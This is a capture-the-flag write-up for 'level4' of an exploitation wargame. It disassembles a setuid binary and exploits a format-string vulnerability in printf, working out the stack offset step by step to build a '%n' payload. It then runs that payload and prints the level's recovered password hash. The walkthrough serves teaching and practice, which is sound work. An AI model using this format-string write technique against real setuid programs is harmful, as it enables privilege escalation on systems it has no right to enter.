What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4*
	-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
	-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile

A `level4` binary. Let's check the assembly:

	$ gdb ./level4
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x080484a7 <+0>:	push   %ebp
	0x080484a8 <+1>:	mov    %esp,%ebp
	=> 0x080484aa <+3>:	and    $0xfffffff0,%esp
	0x080484ad <+6>:	call   0x8048457 <n>
	0x080484b2 <+11>:	leave  
	0x080484b3 <+12>:	ret    
	End of assembler dump.

It simply calls a function `n` (+6). If we check its assembly:

	(gdb) disas n
	Dump of assembler code for function n:
	0x08048457 <+0>:	push   %ebp
	0x08048458 <+1>:	mov    %esp,%ebp
	0x0804845a <+3>:	sub    $0x218,%esp
	0x08048460 <+9>:	mov    0x8049804,%eax
	0x08048465 <+14>:	mov    %eax,0x8(%esp)
	0x08048469 <+18>:	movl   $0x200,0x4(%esp)
	0x08048471 <+26>:	lea    -0x208(%ebp),%eax
	0x08048477 <+32>:	mov    %eax,(%esp)
	0x0804847a <+35>:	call   0x8048350 <fgets@plt>
	0x0804847f <+40>:	lea    -0x208(%ebp),%eax
	0x08048485 <+46>:	mov    %eax,(%esp)
	0x08048488 <+49>:	call   0x8048444 <p>
	0x0804848d <+54>:	mov    0x8049810,%eax
	0x08048492 <+59>:	cmp    $0x1025544,%eax
	0x08048497 <+64>:	jne    0x80484a5 <n+78>
	0x08048499 <+66>:	movl   $0x8048590,(%esp)
	0x080484a0 <+73>:	call   0x8048360 <system@plt>
	0x080484a5 <+78>:	leave  
	0x080484a6 <+79>:	ret    
	End of assembler dump.

It does a buffer of 536 (+3), does a `fgets` (+9 to +35), calls `p` with the buffer, and checks that the value at `0x8049810` is equal to `0x1025544` (16930116 in decimal).

Let's check the assembly of `p` too:

	(gdb) disas p
	Dump of assembler code for function p:
	0x08048444 <+0>:	push   %ebp
	0x08048445 <+1>:	mov    %esp,%ebp
	0x08048447 <+3>:	sub    $0x18,%esp
	0x0804844a <+6>:	mov    0x8(%ebp),%eax
	0x0804844d <+9>:	mov    %eax,(%esp)
	0x08048450 <+12>:	call   0x8048340 <printf@plt>
	0x08048455 <+17>:	leave  
	0x08048456 <+18>:	ret    
	End of assembler dump.

A `printf`. It's basically the same as the previous exercise, but writing so many character is bothersome, so we'll use the width specification of `printf` to emit the number of character wanted, and not forget to remove 4 bytes for the address (`%16930112c`). Then, the address of the variable (`0x8049810`) in little endian (`\x10\x98\x04\x08`). Calculating the offset would be too annoying, so we'll put it before, though (`\x10\x98\x04\x08%16930112c`).

Exactly as in the previous exercice; we need the offset of the buffer to know which argument to use a `%n` on. In `n`, we sub `0x218` to `esp` (+3), so `esp` is now at `0x218` (and thus `ebp - 0x218`). However, the buffer is loaded from `-x208(%ebp)` (+26 and +40) for the functions, which means its start is actually at `esp + 0x10` (esp + 16, in decimal). As per the  x86 assembly convention, arguments are accessible from `esp+<X>`, each argument espaced by 4. So, our stack looks like that right before the call to `p` (+49):

	|-------------------------------|
    | esp+[...] | Buffer[...]       |
	|-------------------------------|
	| esp+16    | Buffer            |
	|-------------------------------|
	| esp+12    | Arg 3             |
	|-------------------------------|
	| esp+8     | Arg 2             |
	|-------------------------------|
	| esp+4     | Arg 1             |
	|-------------------------------|
	| esp       | Address of Buffer |
	|-------------------------------|

Then, we `call 0x8048444 <p>`, which has for effect to push the address of return to the stack. `p` pushes `ebp` (+0), and it also `sub $0x18,%esp` (24 in decimal), leading our stack to be like that:

	|-------------------------------|-------------------|
    | esp+[...] | Buffer[...]       | VarArg X          |
	|-------------------------------|-------------------|
	| esp+48    | Buffer            | VarArg 12         |
	|-------------------------------|-------------------|
	| esp+44    | Arg 3             | VarArg 11         |
	|-------------------------------|-------------------|
	| esp+40    | Arg 2             | VarArg 10         |
	|-------------------------------|-------------------|
	| esp+36    | Arg 1             | VarArg 9          |
	|-------------------------------|-------------------|
	| esp+32    | Address of Buffer | VarArg 8          |
	|-------------------------------|-------------------|
	| esp+28    | Address of return | VarArg 7          |
	|-------------------------------|-------------------|
	| esp+24    | ebp               | VarArg 6          |
	|-------------------------------|-------------------|
	| esp+20    | sub[20-23]        | VarArg 5          |
	|-------------------------------|-------------------|
	| esp+16    | sub[16-19]        | VarArg 4          |
	|-------------------------------|-------------------|
	| esp+12    | sub[12-15]        | VarArg 3          |
	|-------------------------------|-------------------|
	| esp+8     | sub[8-11]         | VarArg 2          |
	|-------------------------------|-------------------|
	| esp+4     | sub[4-7]          | VarArg 1          |
	|-------------------------------|-------------------|
	| esp       | sub[0-3]          | Address of buffer |
	|-------------------------------|-------------------|

So it's the 12th argument. The full string thus is `\x10\x98\x04\x08%16930112c%12$n`.

	$ (printf '%b' '\x10\x98\x04\x08%16930112c%12$n') | ./level4
	[...]
	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
